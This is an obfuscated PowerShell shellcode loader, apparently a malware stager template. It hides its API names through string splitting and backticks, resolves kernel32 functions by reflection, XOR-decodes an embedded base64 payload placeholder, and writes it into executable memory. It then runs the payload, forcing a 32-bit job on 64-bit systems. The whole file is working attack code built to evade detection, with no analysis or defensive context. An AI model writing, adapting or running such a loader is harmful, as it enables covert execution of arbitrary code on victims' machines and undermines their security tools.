sET-`s`TRicTmO`dE -Version 2

${D`oiT} = @'
function FU`NC_gEt_PrO`C_AD`DrE`SS {
	Param (${VAR`_`modUlE}, ${v`AR_pROCe`d`UrE})		
	${VaR`_unsA`FE_nA`Ti`VE_METHO`ds} = ([AppDomain]::"cur`RentdOm`AIn".("{2}{1}{0}{3}"-f 'm','etAsse','G','blies').Invoke() | WH`erE-`OBj`EcT { ${_}."gLO`BALassem`B`l`ycACHe" -And ${_}."l`OcA`TiON".("{0}{1}"-f 'Spli','t').Invoke('\\')[-1].("{0}{1}" -f'Equa','ls').Invoke(("{1}{0}{2}" -f 'em.d','Syst','ll')) }).("{2}{1}{0}"-f'e','tTyp','Ge').Invoke(("{9}{4}{2}{3}{6}{1}{0}{7}{8}{5}"-f't','2.UnsafeNa','ft','.Wi','croso','thods','n3','i','veMe','Mi'))
	${V`Ar_G`Pa} = ${v`AR`_un`SaFE`_nAT`IVE_MethO`DS}.("{0}{2}{1}" -f 'GetMe','d','tho').Invoke(("{4}{3}{1}{0}{2}" -f 'cAddres','Pro','s','et','G'), [Type[]] @(("{8}{11}{7}{10}{3}{1}{0}{5}{9}{6}{4}{2}"-f'pS','ero','ef','me.Int','eR','ervice','l','u','Sys','s.Hand','nti','tem.R'), ("{0}{2}{1}"-f's','g','trin')))
	return ${V`AR_`Gpa}."INV`Oke"(${nu`Ll}, @([System.Runtime.InteropServices.HandleRef](Ne`w`-Object ('S'+'ystem.Ru'+'ntime.Intero'+'p'+'Ser'+'vices.'+'HandleRef')((n`ew-`oBJEcT ('In'+'tPtr')), (${V`Ar_UnsAfE`_NaTi`V`E_MEtho`ds}.("{1}{0}{2}" -f 'tMet','Ge','hod').Invoke(("{2}{4}{1}{0}{3}"-f'Ha','e','GetMo','ndle','dul')))."inV`OKE"(${nu`ll}, @(${va`R_moDU`LE})))), ${vaR`_P`R`OCe`dUrE}))
}

function F`UNc`_`get_DELegaTe_`TY`PE {
	Param (
		[Parameter(PosiTIOn = 0, mANDAtOry = ${tR`UE})] [Type[]] ${VaR`_`p`ArAMEt`ERS},
		[Parameter(PoSiTion = 1)] [Type] ${var_retuR`N`_T`yPe} = [Void]
	)

	${Var_TyPe`_B`U`il`DER} = [AppDomain]::"c`UrrEnTdO`m`AIN".("{3}{6}{1}{4}{0}{5}{2}"-f'c','eDyn','bly','D','ami','Assem','efin').Invoke((NEW`-ObJE`cT ('System.'+'Ref'+'l'+'e'+'c'+'tion.AssemblyName')(("{2}{0}{3}{1}{4}"-f'le','at','ReflectedDe','g','e'))), [System.Reflection.Emit.AssemblyBuilderAccess]::"r`Un").("{1}{3}{4}{0}{2}"-f'odu','Defin','le','eDynamic','M').Invoke(("{0}{1}{2}" -f'InMe','mor','yModule'), ${f`AlSe}).("{1}{3}{0}{2}"-f 'eT','Def','ype','in').Invoke(("{2}{1}{0}{3}" -f 'leg','De','My','ateType'), ("{1}{8}{11}{12}{4}{7}{6}{2}{3}{9}{5}{10}{0}" -f 'AutoClass','Class, P',', An','s','Se','la','d','ale','ub','iC','ss, ','lic,',' '), [System.MulticastDelegate])
	${vAR_TYp`e`_BUil`D`eR}.("{2}{0}{3}{1}"-f'efin','nstructor','D','eCo').Invoke(("{1}{4}{3}{0}{5}{6}{2}"-f'HideBy','RTSpeci','lic',', ','alName','Sig, P','ub'), [System.Reflection.CallingConventions]::"sTA`NDA`RD", ${Var_`pa`RaM`eTeRs}).("{1}{2}{3}{0}{4}" -f'nFl','SetImp','lemen','tatio','ags').Invoke(("{4}{1}{0}{3}{2}"-f 'ime','unt',' Managed',',','R'))
	${vA`R_TyPE_`BU`IldeR}.("{2}{1}{0}" -f'ethod','M','Define').Invoke('Invoke', ("{1}{0}{6}{3}{8}{5}{2}{4}{7}" -f 'bl','Pu','wSlot,','H',' Virtu','eBySig, Ne','ic, ','al','id'), ${VA`R`_`ReTURn_type}, ${vA`R_p`Aram`EterS}).("{0}{4}{3}{5}{1}{2}" -f 'Se','lag','s','mpleme','tI','ntationF').Invoke(("{4}{2}{1}{0}{3}"-f'ge','a','ntime, Man','d','Ru'))

	return ${VaR_t`y`pe_BU`ILDeR}.("{2}{1}{3}{0}"-f'e','eT','Creat','yp').Invoke()
}

[Byte[]]${v`A`R_COdE} = [System.Convert]::("{4}{2}{3}{0}{1}" -f 'i','ng','omBase64','Str','Fr').Invoke(('%%DATA%%'))

for (${x} = 0; ${x} -lt ${Va`R`_COdE}."Co`UNt"; ${X}++) {
	${Va`R_Co`de}[${x}] = ${vaR_`CODE}[${x}] -bxor 42
}

[Byte[]]${fU`NC_gMh} = [BitConverter]::("{0}{1}{2}" -f'GetB','yte','s').Invoke((f`Unc_Get_P`R`o`C_ADDr`eSs ('kernel3'+'2') ('G'+'etM'+'oduleHandl'+'eA')).("{2}{1}{0}" -f'nt32','I','To').Invoke())
[Byte[]]${fUnC_`G`pA} = [BitConverter]::("{1}{0}" -f 'es','GetByt').Invoke((fuNC_G`Et_`P`R`oC_A`DdRESs ('kern'+'e'+'l32') ('GetProcAdd'+'re'+'s'+'s')).("{1}{2}{0}"-f 'nt32','To','I').Invoke())
[Array]::("{1}{0}" -f 'py','Co').Invoke(${FU`Nc_g`mH}, 0, ${V`A`R_COde}, %%GMH_OFFSET%%, ${f`Un`C_gMH}."LEnG`Th")
[Array]::("{0}{1}" -f'Co','py').Invoke(${f`Un`C_gpA}, 0, ${v`AR`_cODe}, %%GPA_OFFSET%%, ${f`UNC`_g`Pa}."L`EnG`TH")

${V`AR_Va} = [System.Runtime.InteropServices.Marshal]::("{4}{3}{7}{6}{0}{2}{8}{1}{5}" -f 'ForF','nt','unctionPo','tDe','Ge','er','ate','leg','i').Invoke((fU`N`c_ge`T_P`Ro`c_aDD`REss ('k'+'er'+'nel32.d'+'ll') ('Virt'+'u'+'alAlloc')), (fUnC`_gET_D`ElE`gAte_`TypE @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
${vaR_bU`F`FER} = ${vAR`_`Va}."IN`VO`ke"([IntPtr]::"z`ERO", ${v`AR_`COdE}."l`ENGTh", 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::("{0}{1}" -f 'Cop','y').Invoke(${VAr_`CO`De}, 0, ${v`Ar_b`UF`FeR}, ${Va`R_`CoDE}."lE`NGtH")

${v`Ar_rU`NmE} = [System.Runtime.InteropServices.Marshal]::"GeTDElEGATef`oRFuN`CT`ionP`oIn`TER"(${v`Ar`_buF`Fer}, (FuN`C_GET_deL`Eg`ATe`_tyPE @([IntPtr]) ([Void])))
${VaR_`R`UN`Me}."iN`VokE"([IntPtr]::"z`eRO")

'@

If ([IntPtr]::"s`izE" -eq 8) {
	sTa`R`T-`Job { param(${a}) i`eX ${A} } -RunAs32 -Argument ${do`iT} | w`A`iT-joB | Re`Ce`ive-Job
}
else {
	i`ex ${do`it}
}

